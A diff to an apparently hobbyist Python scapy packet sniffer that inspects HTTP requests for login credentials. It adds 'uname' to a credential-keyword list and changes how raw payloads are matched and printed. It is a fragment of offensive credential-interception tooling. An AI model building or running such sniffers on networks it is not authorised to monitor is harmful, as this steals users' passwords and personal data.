@@ -16,17 +16,19 @@ def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load
         username_keywords = ["username", "password",
-                             "email", "key", "user", "id", "login", "pass"]
+                             "email", "key", "user", "id", "login", "pass","uname"]
         for keyword in username_keywords:
-            if keyword in load:
+            if keyword in str(load):
                 return load
 
 
 def process_sniffed_packet(packet):
-    print(packet)
+    packets_list=[]
     if packet.haslayer(http.HTTPRequest):
+        print(packet)
+
         URL = get_url(packet)
-        print("[+] HTTP Request >> ", URL)
+        print("\n\n[+] HTTP Request >> ", URL)
 
         login_info = get_login_info(packet)
         if login_info:
